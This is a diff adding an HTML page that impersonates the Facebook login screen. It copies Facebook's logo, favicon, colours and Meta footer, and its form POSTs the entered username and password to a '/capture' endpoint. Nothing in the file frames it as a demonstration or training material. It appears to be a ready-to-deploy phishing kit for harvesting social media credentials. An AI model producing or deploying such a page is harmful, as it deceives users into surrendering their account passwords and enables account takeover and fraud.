@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" type="image/x-icon">
+    <meta name="description" content="Login to Facebook securely">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            bottom: 195px;
+        }
+        .login-container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #1877f2;
+            font-weight: bold;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-container button:hover {
+            background-color: #165fbe;
+        }
+        .login-container a {
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        h3 {
+            font-size: 18px;
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+        }
+        img {
+            margin-bottom: 1px;
+            position: relative;
+            bottom: 195px;
+            width: 240px;
+        }
+        .blow {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            gap: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facebook">
+    </div>
+    <div class="login-container">
+        <h3>Log Into Facebook</h3>
+        <form id="loginForm" method="POST" action="/capture">
+            <input type="text" name="username" placeholder="Username" required><br><br>
+            <input type="password" name="password" placeholder="Password" required><br><br>
+            <button type="submit">Login</button>
+        </form>
+        <div class="blow">
+            <a href="#">Forgot account?</a>
+            <a href="#">Sign up for Facebook</a>
+        </div>
+    </div>
+    <footer>
+        <div style="text-align: center; color: #606770; font-size: 12px; margin-top: 20px;">
+            <div style="margin-bottom: 10px;">
+                English (US) · Français (France) · Tiếng Việt · 中文(简体) · ภาษาไทย · 한국어 · 日本語 · Español · Português (Brasil) · Deutsch · 
+                <a href="#" style="color: #1877f2; text-decoration: none;">+</a>
+            </div>
+            <div style="margin-bottom: 10px;">
+                <a href="#" style="color: #1877f2; text-decoration: none;">Sign Up</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Log In</a> ·
+                <a href="#" style="color: #1877f2; text-decoration: none;">Messenger</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Facebook Lite</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Video</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Places</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Games</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Marketplace</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Meta Pay</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Meta Store</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Meta Quest</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Ray-Ban Meta</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Meta AI</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Create Page</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Developers</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Careers</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Privacy Policy</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Terms</a> ·  
+                <a href="#" style="color: #1877f2; text-decoration: none;">Help</a>
+            </div>
+            <div>
+                Meta © 2024
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
